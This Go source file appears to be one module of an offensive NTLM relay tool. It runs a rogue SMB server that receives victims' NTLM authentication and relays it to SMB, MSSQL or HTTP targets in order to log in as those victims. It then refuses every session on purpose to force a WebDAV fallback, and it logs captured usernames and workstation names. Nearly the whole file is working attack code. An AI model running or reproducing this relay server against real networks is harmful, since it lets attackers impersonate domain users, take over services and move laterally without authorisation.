package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"time"
)

// SMB2 constants
const (
	ProtocolSMB2 = "\xFE\x53\x4D\x42"
	ProtocolSMB1 = "\xFF\x53\x4D\x42"

	SMB2_NEGOTIATE     = 0x0000
	SMB2_SESSION_SETUP = 0x0001
	SMB2_TREE_CONNECT  = 0x0003
	SMB2_ECHO          = 0x000C

	STATUS_SUCCESS                  = 0x00000000
	STATUS_PENDING                  = 0x00000103
	STATUS_MORE_PROCESSING_REQUIRED = 0xC0000016
	STATUS_LOGON_FAILURE            = 0xC000006D
	STATUS_BAD_NETWORK_NAME         = 0xC00000CC

	SMB2_DIALECT_0210 = 0x0210

	SMB2_FLAGS_SERVER_TO_REDIR = 0x00000001
)

type SMBCoercionServer struct {
	listener net.Listener
}

func NewSMBCoercionServer(addr string) (*SMBCoercionServer, error) {
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, err
	}
	return &SMBCoercionServer{listener: listener}, nil
}

func (s *SMBCoercionServer) Start() error {
	log.Printf("[+] SMB server listening on %s%s",
		s.listener.Addr().String(), Reset)

	for {
		conn, err := s.listener.Accept()
		if err != nil {
			log.Printf("%s%s%s [SMB]%s Accept error: %v%s",
				Grey, time.Now().Format("15:04:05"), Reset, Red, err, Reset)
			continue
		}
		go s.handleConnection(conn)
	}
}

func (s *SMBCoercionServer) handleConnection(conn net.Conn) {
	defer conn.Close()

	now := time.Now().Format("15:04:05")
	clientAddr := conn.RemoteAddr().String()

	smbTarget := findFirstSMBTarget()
	httpTarget := findFirstHTTPTarget()
	if smbTarget != "" {
		log.Printf("%s%s%s [SMB]%s %s SMB2 connection. Relaying to %s%s",
			Grey, now, Reset, Yellow, clientAddr, smbTarget, Reset)
	} else if httpTarget != "" {
		log.Printf("%s%s%s [SMB]%s %s SMB2 connection. Relaying to %s%s",
			Grey, now, Reset, Yellow, clientAddr, httpTarget, Reset)
	} else {
		log.Printf("%s%s%s [SMB]%s %s SMB2 connection. No relay target, coercing WebDAV fallback%s",
			Grey, now, Reset, Yellow, clientAddr, Reset)
	}

	sessionID := uint64(0x1122334455667788)
	var relay *smbRelayConn

	for {
		packet, err := readNetBIOSPacket(conn)
		if err != nil {
			if err != io.EOF && debug {
				log.Printf("%s%s%s [SMB]%s Connection closed from %s: %v%s",
					Grey, time.Now().Format("15:04:05"), Reset, Grey, clientAddr, err, Reset)
			}
			return
		}

		if len(packet) < 4 {
			continue
		}

		protID := string(packet[0:4])

		if protID == ProtocolSMB1 {
			s.handleSMB1(conn, packet, clientAddr)
		} else if protID == ProtocolSMB2 {
			s.handleSMB2(conn, packet, clientAddr, &sessionID, &relay)
		}
	}
}

func readNetBIOSPacket(conn net.Conn) ([]byte, error) {
	var size uint32
	if err := binary.Read(conn, binary.BigEndian, &size); err != nil {
		return nil, err
	}
	if size > 0x00FFFFFF {
		return nil, fmt.Errorf("invalid NetBIOS message size: %d", size)
	}
	packet := make([]byte, size)
	if _, err := io.ReadFull(conn, packet); err != nil {
		return nil, err
	}
	return packet, nil
}

func (s *SMBCoercionServer) handleSMB1(conn net.Conn, data []byte, clientAddr string) {
	if len(data) < 32 {
		return
	}
	command := data[4]
	if command == 0x72 { // SMB_COM_NEGOTIATE
		if debug {
			log.Printf("%s%s%s [SMB]%s SMB1 Negotiate from %s, upgrading to SMB2%s",
				Grey, time.Now().Format("15:04:05"), Reset, Yellow, clientAddr, Reset)
		}
		s.sendSMB2NegotiateForSMB1(conn)
	}
}

func (s *SMBCoercionServer) sendSMB2NegotiateForSMB1(conn net.Conn) {
	response := make([]byte, 4+64+65)
	binary.BigEndian.PutUint32(response[0:4], uint32(len(response)-4))

	// SMB2 Header
	copy(response[4:8], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(response[8:10], 64)
	binary.LittleEndian.PutUint16(response[10:12], 1)
	binary.LittleEndian.PutUint32(response[12:16], STATUS_SUCCESS)
	binary.LittleEndian.PutUint16(response[16:18], SMB2_NEGOTIATE)
	binary.LittleEndian.PutUint16(response[18:20], 1)
	binary.LittleEndian.PutUint32(response[20:24], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint64(response[28:36], 0)

	// Negotiate Response
	binary.LittleEndian.PutUint16(response[68:70], 65)
	binary.LittleEndian.PutUint16(response[70:72], 0x01)
	binary.LittleEndian.PutUint16(response[72:74], SMB2_DIALECT_0210)
	copy(response[76:92], []byte{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16})
	binary.LittleEndian.PutUint32(response[96:100], 65536)
	binary.LittleEndian.PutUint32(response[100:104], 65536)
	binary.LittleEndian.PutUint32(response[104:108], 65536)
	
	winTime := timeToFileTime(time.Now())
	binary.LittleEndian.PutUint64(response[108:116], winTime)
	binary.LittleEndian.PutUint64(response[116:124], winTime)
	binary.LittleEndian.PutUint16(response[124:126], 128)

	conn.Write(response)
}

func (s *SMBCoercionServer) handleSMB2(conn net.Conn, data []byte, clientAddr string, sessionID *uint64, relay **smbRelayConn) {
    if len(data) < 64 {
        return
    }

    command := binary.LittleEndian.Uint16(data[12:14])
    messageID := binary.LittleEndian.Uint64(data[24:32])

    now := time.Now().Format("15:04:05")

    switch command {
    case SMB2_NEGOTIATE:
		s.sendNegotiateResponse(conn, messageID)

    case SMB2_SESSION_SETUP:
        if len(data) < 64+16 {
            return
        }

        secOffset := binary.LittleEndian.Uint16(data[64+12 : 64+14])
        secLength := binary.LittleEndian.Uint16(data[64+14 : 64+16])

        if secLength == 0 || int(secOffset) > len(data) || int(secOffset)+int(secLength) > len(data) {
            if verbose {
                log.Printf("%s%s%s [SMB]%s Invalid security buffer%s",
                    Grey, now, Reset, Red, Reset)
            }
            return
        }

        secBlob := data[secOffset : secOffset+secLength]
        useSPNEGO := len(secBlob) > 0 && secBlob[0] == 0x60
        ntlmType := detectNTLMType(secBlob)

        if ntlmType == 1 {
            rawNTLM := extractNTLMFromBlob(secBlob)
            if rawNTLM != nil {
                // Try SMB target first (pass full SPNEGO blob to preserve MIC)
                if findFirstSMBTarget() != "" {
                    rc, respBlob, err := smbRelayType1SMB(clientAddr, secBlob)
                    if err == nil {
                        *relay = rc
                        log.Printf("%s%s%s [SMB]%s Forwarding NTLM type 1 from %s to %s%s",
                            Grey, now, Reset, Yellow, clientAddr, rc.targetURL, Reset)
                        s.sendSessionSetupChallengeRaw(conn, messageID, *sessionID, respBlob)
                        log.Printf("%s%s%s [SMB]%s Returning NTLM type 2 from %s to %s%s",
                            Grey, now, Reset, Yellow, rc.targetURL, clientAddr, Reset)
                        return
                    }
                    log.Printf("%s%s%s [SMB]%s Relay to SMB failed (%v), trying HTTP%s",
                        Grey, now, Reset, Yellow, err, Reset)
                }

                // Try MSSQL target
                if findFirstMSSQLTarget() != "" {
                    rc, rawType2, err := smbRelayType1MSSQL(clientAddr, rawNTLM)
                    if err == nil {
                        *relay = rc
                        log.Printf("%s%s%s [SMB]%s Forwarding NTLM type 1 from %s to %s%s",
                            Grey, now, Reset, Yellow, clientAddr, rc.targetURL, Reset)
                        var respBlob []byte
                        if useSPNEGO {
                            respBlob = wrapInSPNEGO(rawType2)
                        } else {
                            respBlob = rawType2
                        }
                        s.sendSessionSetupChallengeRaw(conn, messageID, *sessionID, respBlob)
                        log.Printf("%s%s%s [SMB]%s Returning NTLM type 2 from %s to %s%s",
                            Grey, now, Reset, Yellow, rc.targetURL, clientAddr, Reset)
                        return
                    }
                    log.Printf("%s%s%s [SMB]%s Relay to MSSQL failed (%v), trying HTTP%s",
                        Grey, now, Reset, Yellow, err, Reset)
                }

                // Try HTTP target
                rc, respBlob, err := smbRelayType1(clientAddr, rawNTLM, useSPNEGO)
                if err == nil {
                    *relay = rc
                    log.Printf("%s%s%s [SMB]%s Forwarding NTLM type 1 from %s to %s%s",
                        Grey, now, Reset, Yellow, clientAddr, rc.targetURL, Reset)
                    s.sendSessionSetupChallengeRaw(conn, messageID, *sessionID, respBlob)
                    log.Printf("%s%s%s [SMB]%s Returning NTLM type 2 from %s to %s%s",
                        Grey, now, Reset, Yellow, rc.targetURL, clientAddr, Reset)
                    return
                }
                if findFirstHTTPTarget() != "" {
                    log.Printf("%s%s%s [SMB]%s Relay to HTTP failed (%v), sending fake challenge to %s%s",
                        Grey, now, Reset, Yellow, err, clientAddr, Reset)
                }
            }
            // fallback: fake challenge to trigger WebDAV
            s.sendSessionSetupChallenge(conn, messageID, *sessionID, useSPNEGO)

        } else if ntlmType == 3 {
            rawNTLM := extractNTLMFromBlob(secBlob)
            username := extractUsernameFromNTLM(secBlob)
            workstation := ""
            if rawNTLM != nil {
                _, _, workstation, _ = parseNTLMv2AuthIdentity(rawNTLM)
            }

            if *relay != nil && rawNTLM != nil {
                log.Printf("%s%s%s [SMB]%s %s - Forwarding NTLM type 3 from %s (%s) to %s%s",
                    Grey, now, Reset, Yellow, username, workstation, clientAddr, (*relay).targetURL, Reset)

                if (*relay).isSMB {
                    ok, _, err := smbRelayType3SMB(*relay, secBlob, rawNTLM)
                    if err != nil {
                        log.Printf("%s%s%s [SMB]%s %s - SMB relay error: %v%s",
                            Grey, now, Reset, Red, username, err, Reset)
                    } else if ok {
                        log.Printf("%s%s%s [SMB]%s %s - Authenticated to %s%s",
                            Grey, now, Reset, Green, username, (*relay).targetURL, Reset)
                    } else {
                        log.Printf("%s%s%s [SMB]%s %s - Authentication failed to %s%s",
                            Grey, now, Reset, Red, username, (*relay).targetURL, Reset)
                    }
                } else if (*relay).isMSSQL {
                    ok, _, err := smbRelayType3MSSQL(*relay, rawNTLM)
                    if err != nil {
                        log.Printf("%s%s%s [SMB]%s %s - MSSQL relay error: %v%s",
                            Grey, now, Reset, Red, username, err, Reset)
                    } else if ok {
                        log.Printf("%s%s%s [SMB]%s %s - Authenticated to %s%s",
                            Grey, now, Reset, Green, username, (*relay).targetURL, Reset)
                    } else {
                        log.Printf("%s%s%s [SMB]%s %s - Authentication failed to %s%s",
                            Grey, now, Reset, Red, username, (*relay).targetURL, Reset)
                    }
                } else {
                    ok, _, err := smbRelayType3(*relay, rawNTLM)
                    if err != nil {
                        log.Printf("%s%s%s [SMB]%s %s - HTTP relay error: %v%s",
                            Grey, now, Reset, Red, username, err, Reset)
                    } else if ok {
                        log.Printf("%s%s%s [SMB]%s %s - Authenticated to %s%s",
                            Grey, now, Reset, Green, username, (*relay).targetURL, Reset)
                    } else {
                        log.Printf("%s%s%s [SMB]%s %s - Authentication failed to %s%s",
                            Grey, now, Reset, Red, username, (*relay).targetURL, Reset)
                    }
                }
                *relay = nil
            } else {
                log.Printf("%s%s%s [SMB]%s %s - NTLM type 3 from %s (%s). No relay target%s",
                    Grey, now, Reset, Yellow, username, workstation, clientAddr, Reset)
            }
            // always reject to trigger WebDAV fallback
            log.Printf("%s%s%s [SMB]%s %s - Sending STATUS_LOGON_FAILURE to trigger WebDAV fallback%s",
                Grey, now, Reset, Yellow, username, Reset)
            s.sendSessionSetupDenied(conn, messageID, *sessionID)
            time.Sleep(100 * time.Millisecond)
            return
        }

    case SMB2_TREE_CONNECT:
		if verbose {
			log.Printf("%s%s%s [SMB]%s TreeConnect from %s - denying%s",
				Grey, now, Reset, Yellow, clientAddr, Reset)
		}
		s.sendTreeConnectError(conn, messageID)
	}
}

func (s *SMBCoercionServer) sendNegotiateResponse(conn net.Conn, messageID uint64) {
	response := make([]byte, 4+64+65)
	binary.BigEndian.PutUint32(response[0:4], uint32(len(response)-4))

	// SMB2 Header
	copy(response[4:8], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(response[8:10], 64)
	binary.LittleEndian.PutUint16(response[10:12], 1)
	binary.LittleEndian.PutUint32(response[12:16], STATUS_SUCCESS)
	binary.LittleEndian.PutUint16(response[16:18], SMB2_NEGOTIATE)
	binary.LittleEndian.PutUint16(response[18:20], 1)
	binary.LittleEndian.PutUint32(response[20:24], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint32(response[24:28], 0)
	binary.LittleEndian.PutUint64(response[28:36], messageID)
	binary.LittleEndian.PutUint32(response[36:40], 0)
	binary.LittleEndian.PutUint32(response[40:44], 0)
	binary.LittleEndian.PutUint64(response[44:52], 0)

	// Negotiate Response
	binary.LittleEndian.PutUint16(response[68:70], 65)
	binary.LittleEndian.PutUint16(response[70:72], 0x01)
	binary.LittleEndian.PutUint16(response[72:74], SMB2_DIALECT_0210)
	binary.LittleEndian.PutUint16(response[74:76], 0)
	copy(response[76:92], []byte{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16})
	binary.LittleEndian.PutUint32(response[92:96], 0)
	binary.LittleEndian.PutUint32(response[96:100], 65536)
	binary.LittleEndian.PutUint32(response[100:104], 65536)
	binary.LittleEndian.PutUint32(response[104:108], 65536)
	
	winTime := timeToFileTime(time.Now())
	binary.LittleEndian.PutUint64(response[108:116], winTime)
	binary.LittleEndian.PutUint64(response[116:124], winTime)
	binary.LittleEndian.PutUint16(response[124:126], 128)
	binary.LittleEndian.PutUint16(response[126:128], 0)
	binary.LittleEndian.PutUint32(response[128:132], 0)

	conn.Write(response)
}

func (s *SMBCoercionServer) sendSessionSetupChallenge(conn net.Conn, messageID, sessionID uint64, useSPNEGO bool) {
    ntlmChallenge := buildNTLMType2()

    var secBlob []byte
    if useSPNEGO {
        // Client used SPNEGO → respond with SPNEGO/NTLM
        secBlob = wrapInSPNEGO(ntlmChallenge)
    } else {
        // Client used bare NTLMSSP → respond with bare NTLM Type 2
        secBlob = ntlmChallenge
    }

    response := make([]byte, 4+64+9+len(secBlob))
    binary.BigEndian.PutUint32(response[0:4], uint32(len(response)-4))

    // SMB2 Header (64 bytes starting at offset 4)
    copy(response[4:8], []byte{0xFE, 'S', 'M', 'B'})
    binary.LittleEndian.PutUint16(response[8:10], 64) // StructureSize
    binary.LittleEndian.PutUint16(response[10:12], 1) // CreditCharge
    binary.LittleEndian.PutUint32(response[12:16], STATUS_MORE_PROCESSING_REQUIRED)
    binary.LittleEndian.PutUint16(response[16:18], SMB2_SESSION_SETUP)
    binary.LittleEndian.PutUint16(response[18:20], 1) // CreditResponse
    binary.LittleEndian.PutUint32(response[20:24], SMB2_FLAGS_SERVER_TO_REDIR)
    binary.LittleEndian.PutUint32(response[24:28], 0) // ChainOffset
    binary.LittleEndian.PutUint64(response[28:36], messageID)
    binary.LittleEndian.PutUint32(response[36:40], 0) // ProcessId
    binary.LittleEndian.PutUint32(response[40:44], 0) // TreeId
    binary.LittleEndian.PutUint64(response[44:52], sessionID)

    // Session Setup Response (starts at offset 68 = 4+64)
    binary.LittleEndian.PutUint16(response[68:70], 9) // StructureSize
    binary.LittleEndian.PutUint16(response[70:72], 0) // SessionFlags

    // SecurityBufferOffset is from the start of the SMB2 header, i.e. 4 bytes earlier
    securityOffset := uint16(76 - 4) // absolute index 76 => offset 72 (0x48)
    binary.LittleEndian.PutUint16(response[72:74], securityOffset)
    binary.LittleEndian.PutUint16(response[74:76], uint16(len(secBlob)))

    copy(response[76:], secBlob)

    _, _ = conn.Write(response)
}

func (s *SMBCoercionServer) sendSessionSetupDenied(conn net.Conn, messageID, sessionID uint64) {
	// SPNEGO negTokenResp with negResult=reject (2)
	// a1 07 30 05 a0 03 0a 01 02
	spnegoReject := []byte{0xa1, 0x07, 0x30, 0x05, 0xa0, 0x03, 0x0a, 0x01, 0x02}

	response := make([]byte, 4+64+9+len(spnegoReject))
	binary.BigEndian.PutUint32(response[0:4], uint32(len(response)-4))

	// SMB2 Header
	copy(response[4:8], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(response[8:10], 64)
	binary.LittleEndian.PutUint16(response[10:12], 1)
	binary.LittleEndian.PutUint32(response[12:16], STATUS_LOGON_FAILURE)
	binary.LittleEndian.PutUint16(response[16:18], SMB2_SESSION_SETUP)
	binary.LittleEndian.PutUint16(response[18:20], 1)
	binary.LittleEndian.PutUint32(response[20:24], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint32(response[24:28], 0)
	binary.LittleEndian.PutUint64(response[28:36], messageID)
	binary.LittleEndian.PutUint32(response[36:40], 0)
	binary.LittleEndian.PutUint32(response[40:44], 0)
	binary.LittleEndian.PutUint64(response[44:52], sessionID)

	// Session Setup Response with SPNEGO reject blob
	securityOffset := uint16(76 - 4) // offset from SMB2 header start
	binary.LittleEndian.PutUint16(response[68:70], 9)
	binary.LittleEndian.PutUint16(response[70:72], 0)
	binary.LittleEndian.PutUint16(response[72:74], securityOffset)
	binary.LittleEndian.PutUint16(response[74:76], uint16(len(spnegoReject)))
	copy(response[76:], spnegoReject)

	conn.Write(response)
}

func (s *SMBCoercionServer) sendTreeConnectError(conn net.Conn, messageID uint64) {
	response := make([]byte, 4+64+16)
	binary.BigEndian.PutUint32(response[0:4], uint32(len(response)-4))

	copy(response[4:8], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(response[8:10], 64)
	binary.LittleEndian.PutUint16(response[10:12], 1)
	binary.LittleEndian.PutUint32(response[12:16], STATUS_BAD_NETWORK_NAME)
	binary.LittleEndian.PutUint16(response[16:18], SMB2_TREE_CONNECT)
	binary.LittleEndian.PutUint16(response[18:20], 1)
	binary.LittleEndian.PutUint32(response[20:24], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint32(response[24:28], 0)
	binary.LittleEndian.PutUint64(response[28:36], messageID)
	binary.LittleEndian.PutUint32(response[36:40], 0)
	binary.LittleEndian.PutUint32(response[40:44], 0)
	binary.LittleEndian.PutUint64(response[44:52], 0)

	// Tree Connect Response
	binary.LittleEndian.PutUint16(response[68:70], 16)

	conn.Write(response)
}

// parseSMBName parses the -smb-name flag (DOMAIN\computer.fqdn) into components.
func parseSMBName() (nbDomain, nbComputer, dnsDomain, dnsComputer string) {
	nbDomain = "WORKGROUP"
	nbComputer = "FILE-SRV"
	dnsDomain = "workgroup.local"
	dnsComputer = "file-srv.workgroup.local"

	if smbServerName == "" {
		return
	}

	fqdn := smbServerName
	if parts := strings.SplitN(smbServerName, `\`, 2); len(parts) == 2 {
		nbDomain = strings.ToUpper(parts[0])
		fqdn = parts[1]
	}

	dnsComputer = fqdn
	if parts := strings.SplitN(fqdn, ".", 2); len(parts) == 2 {
		nbComputer = strings.ToUpper(parts[0])
		dnsDomain = parts[1]
		// Only derive nbDomain from FQDN if not explicitly set via DOMAIN\ prefix
		if !strings.Contains(smbServerName, `\`) {
			if domParts := strings.SplitN(dnsDomain, ".", 2); len(domParts) > 0 {
				nbDomain = strings.ToUpper(domParts[0])
			}
		}
	}
	return
}

func buildNTLMType2() []byte {
	// Generate random 8-byte challenge
	serverChallenge := make([]byte, 8)
	rand.Read(serverChallenge)
	
	nbDomainStr, _, _, _ := parseSMBName()
	targetName := encodeUTF16LE(nbDomainStr)
	targetInfo := buildTargetInfo()
	
	targetNameOffset := 56
	targetInfoOffset := targetNameOffset + len(targetName)
	totalSize := targetInfoOffset + len(targetInfo)
	
	challenge := make([]byte, totalSize)
	
	// Signature
	copy(challenge[0:8], []byte{'N', 'T', 'L', 'M', 'S', 'S', 'P', 0x00})
	
	// Message Type = 2
	binary.LittleEndian.PutUint32(challenge[8:12], 2)
	
	// TargetName fields
	binary.LittleEndian.PutUint16(challenge[12:14], uint16(len(targetName)))
	binary.LittleEndian.PutUint16(challenge[14:16], uint16(len(targetName)))
	binary.LittleEndian.PutUint32(challenge[16:20], uint32(targetNameOffset))
	
	// Flags - EXACTLY match the working server: 0xe2898215
	flags := uint32(0xe2898215)
	binary.LittleEndian.PutUint32(challenge[20:24], flags)
	
	// ServerChallenge
	copy(challenge[24:32], serverChallenge)
	
	// Reserved (8 bytes of zeros) - already zero from make()
	
	// TargetInfo fields
	binary.LittleEndian.PutUint16(challenge[40:42], uint16(len(targetInfo)))
	binary.LittleEndian.PutUint16(challenge[42:44], uint16(len(targetInfo)))
	binary.LittleEndian.PutUint32(challenge[44:48], uint32(targetInfoOffset))
	
	// Version - Match real server: 10.0 Build 22621
	challenge[48] = 10  // Major
	challenge[49] = 0   // Minor
	binary.LittleEndian.PutUint16(challenge[50:52], 22621) // Build
	challenge[52] = 0   // Reserved
	challenge[53] = 0   // Reserved
	challenge[54] = 0   // Reserved
	challenge[55] = 15  // NTLM Revision
	
	// Copy payloads
	copy(challenge[targetNameOffset:], targetName)
	copy(challenge[targetInfoOffset:], targetInfo)
	
	return challenge
}

func buildTargetInfo() []byte {
	// Match the exact order from working server
	const (
		MsvAvEOL             = 0x0000
		MsvAvNbComputerName  = 0x0001
		MsvAvNbDomainName    = 0x0002
		MsvAvDnsComputerName = 0x0003
		MsvAvDnsDomainName   = 0x0004
		MsvAvDnsTreeName     = 0x0005
		MsvAvTimestamp       = 0x0007
	)

	nbDomainStr, nbComputerStr, dnsDomainStr, dnsComputerStr := parseSMBName()

	nbDomain := encodeUTF16LE(nbDomainStr)
	nbComputer := encodeUTF16LE(nbComputerStr)
	dnsDomain := encodeUTF16LE(dnsDomainStr)
	dnsComputer := encodeUTF16LE(dnsComputerStr)
	dnsTree := encodeUTF16LE(dnsDomainStr)
	
	// Timestamp (Windows FILETIME format)
	timestamp := make([]byte, 8)
	binary.LittleEndian.PutUint64(timestamp, timeToFileTime(time.Now()))
	
	info := []byte{}
	
	// EXACT order from working capture:
	// 1. NetBIOS domain name (0x0002)
	// 2. NetBIOS computer name (0x0001)
	// 3. DNS domain name (0x0004)
	// 4. DNS computer name (0x0003)
	// 5. DNS tree name (0x0005)
	// 6. Timestamp (0x0007)
	// 7. EOL (0x0000)
	
	info = appendAVPair(info, MsvAvNbDomainName, nbDomain)
	info = appendAVPair(info, MsvAvNbComputerName, nbComputer)
	info = appendAVPair(info, MsvAvDnsDomainName, dnsDomain)
	info = appendAVPair(info, MsvAvDnsComputerName, dnsComputer)
	info = appendAVPair(info, MsvAvDnsTreeName, dnsTree)
	info = appendAVPair(info, MsvAvTimestamp, timestamp)
	info = appendAVPair(info, MsvAvEOL, []byte{})
	
	return info
}

func appendAVPair(info []byte, avType uint16, value []byte) []byte {
	pair := make([]byte, 4+len(value))
	binary.LittleEndian.PutUint16(pair[0:2], avType)
	binary.LittleEndian.PutUint16(pair[2:4], uint16(len(value)))
	copy(pair[4:], value)
	return append(info, pair...)
}

func encodeUTF16LE(s string) []byte {
	result := make([]byte, len(s)*2)
	for i, r := range s {
		binary.LittleEndian.PutUint16(result[i*2:], uint16(r))
	}
	return result
}

func timeToFileTime(t time.Time) uint64 {
	// Windows FILETIME: 100-nanosecond intervals since Jan 1, 1601
	const epochDiff = 116444736000000000
	unixNano := t.UnixNano()
	return uint64(unixNano/100 + epochDiff)
}

// buildNegTokenResp builds the inner SPNEGO negTokenResp (what you have now).
func buildNegTokenResp(ntlm []byte) []byte {
    // NTLMSSP OID: 1.3.6.1.4.1.311.2.2.10
    ntlmsspOID := []byte{0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a}

    // [a0] negState = accept-incomplete (1)
    negState := []byte{0xa0, 0x03, 0x0a, 0x01, 0x01}

    // [a1] supportedMech (NTLMSSP OID)
    oidData := append([]byte{0x06}, encodeLength(len(ntlmsspOID))...)
    oidData = append(oidData, ntlmsspOID...)
    supportedMech := []byte{0xa1}
    supportedMech = append(supportedMech, encodeLength(len(oidData))...)
    supportedMech = append(supportedMech, oidData...)

    // [a2] responseToken (OCTET STRING with NTLM Type 2)
    octetString := append([]byte{0x04}, encodeLength(len(ntlm))...)
    octetString = append(octetString, ntlm...)
    responseToken := []byte{0xa2}
    responseToken = append(responseToken, encodeLength(len(octetString))...)
    responseToken = append(responseToken, octetString...)

    // inner SEQUENCE [30]
    seqData := append(negState, supportedMech...)
    seqData = append(seqData, responseToken...)
    seq := []byte{0x30}
    seq = append(seq, encodeLength(len(seqData))...)
    seq = append(seq, seqData...)

    // negTokenResp [a1] (this is the CHOICE tag)
    negTokenResp := []byte{0xa1}
    negTokenResp = append(negTokenResp, encodeLength(len(seq))...)
    negTokenResp = append(negTokenResp, seq...)

    return negTokenResp
}

// wrapInSPNEGO wraps negTokenResp in a proper GSS-API SPNEGO token
// suitable for the SMB2 SessionSetup "Security Blob".
func wrapInSPNEGO(ntlm []byte) []byte {
    negTokenResp := buildNegTokenResp(ntlm)

    // SPNEGO OID: 1.3.6.1.5.5.2
    spnegoOID := []byte{0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02}

    // SEQUENCE: mechType (SPNEGO OID) + NegotiationToken (negTokenResp)
    seqData := append(spnegoOID, negTokenResp...)
    seq := []byte{0x60} // APPLICATION 0
    seq = append(seq, encodeLength(len(seqData))...)
    seq = append(seq, seqData...)

    return seq
}


// extractNTLMFromBlob returns the raw NTLM message bytes from a security blob
// (either SPNEGO-wrapped or bare NTLM).
func extractNTLMFromBlob(blob []byte) []byte {
	for i := 0; i < len(blob)-8; i++ {
		if blob[i] == 'N' && blob[i+1] == 'T' && blob[i+2] == 'L' &&
			blob[i+3] == 'M' && blob[i+4] == 'S' && blob[i+5] == 'S' &&
			blob[i+6] == 'P' && blob[i+7] == 0x00 {
			return blob[i:]
		}
	}
	return nil
}

// sendSessionSetupChallengeRaw sends a Session Setup response with a pre-built
// security blob (real Type 2 from relay target) instead of a fake challenge.
func (s *SMBCoercionServer) sendSessionSetupChallengeRaw(conn net.Conn, messageID, sessionID uint64, secBlob []byte) {
	response := make([]byte, 4+64+9+len(secBlob))
	binary.BigEndian.PutUint32(response[0:4], uint32(len(response)-4))

	// SMB2 Header (64 bytes starting at offset 4)
	copy(response[4:8], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(response[8:10], 64)
	binary.LittleEndian.PutUint16(response[10:12], 1)
	binary.LittleEndian.PutUint32(response[12:16], STATUS_MORE_PROCESSING_REQUIRED)
	binary.LittleEndian.PutUint16(response[16:18], SMB2_SESSION_SETUP)
	binary.LittleEndian.PutUint16(response[18:20], 1)
	binary.LittleEndian.PutUint32(response[20:24], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint32(response[24:28], 0)
	binary.LittleEndian.PutUint64(response[28:36], messageID)
	binary.LittleEndian.PutUint32(response[36:40], 0)
	binary.LittleEndian.PutUint32(response[40:44], 0)
	binary.LittleEndian.PutUint64(response[44:52], sessionID)

	// Session Setup Response
	securityOffset := uint16(76 - 4) // offset from SMB2 header start
	binary.LittleEndian.PutUint16(response[68:70], 9)
	binary.LittleEndian.PutUint16(response[70:72], 0)
	binary.LittleEndian.PutUint16(response[72:74], securityOffset)
	binary.LittleEndian.PutUint16(response[74:76], uint16(len(secBlob)))
	copy(response[76:], secBlob)

	conn.Write(response)
}

func encodeLength(length int) []byte {
	if length < 128 {
		return []byte{byte(length)}
	} else if length < 256 {
		return []byte{0x81, byte(length)}
	} else {
		return []byte{0x82, byte(length >> 8), byte(length & 0xff)}
	}
}

func appendASN1Length(data []byte, length int) []byte {
	if length <= 127 {
		return append(data, byte(length))
	} else if length <= 255 {
		return append(data, 0x81, byte(length))
	} else {
		return append(data, 0x82, byte(length>>8), byte(length&0xff))
	}
}

func detectNTLMType(blob []byte) int {
	for i := 0; i < len(blob)-12; i++ {
		if blob[i] == 'N' && blob[i+1] == 'T' && blob[i+2] == 'L' &&
			blob[i+3] == 'M' && blob[i+4] == 'S' && blob[i+5] == 'S' &&
			blob[i+6] == 'P' && blob[i+7] == 0x00 {
			return int(binary.LittleEndian.Uint32(blob[i+8 : i+12]))
		}
	}
	return 0
}

func extractUsernameFromNTLM(blob []byte) string {
	for i := 0; i < len(blob)-64; i++ {
		if blob[i] == 'N' && blob[i+1] == 'T' && blob[i+2] == 'L' &&
			blob[i+3] == 'M' && blob[i+4] == 'S' && blob[i+5] == 'S' &&
			blob[i+6] == 'P' && blob[i+7] == 0x00 {
			ntlm := blob[i:]
			if len(ntlm) < 64 || binary.LittleEndian.Uint32(ntlm[8:12]) != 3 {
				return "unknown"
			}
			domainLen := binary.LittleEndian.Uint16(ntlm[28:30])
			domainOff := binary.LittleEndian.Uint32(ntlm[32:36])
			userLen := binary.LittleEndian.Uint16(ntlm[36:38])
			userOff := binary.LittleEndian.Uint32(ntlm[40:44])

			domain, username := "", "unknown"
			if int(domainOff)+int(domainLen) <= len(ntlm) && domainLen > 0 {
				domain = decodeUTF16LE(ntlm[domainOff : domainOff+uint32(domainLen)])
			}
			if int(userOff)+int(userLen) <= len(ntlm) && userLen > 0 {
				username = decodeUTF16LE(ntlm[userOff : userOff+uint32(userLen)])
			}
			if domain != "" {
				return domain + "\\" + username
			}
			return username
		}
	}
	return "unknown"
}

func decodeUTF16LE(b []byte) string {
	if len(b)%2 != 0 {
		return ""
	}
	result := make([]rune, 0, len(b)/2)
	for i := 0; i < len(b); i += 2 {
		result = append(result, rune(binary.LittleEndian.Uint16(b[i:i+2])))
	}
	return string(result)
}

func StartSMBCoercion(addr string) error {
	server, err := NewSMBCoercionServer(addr)
	if err != nil {
		return err
	}
	return server.Start()
}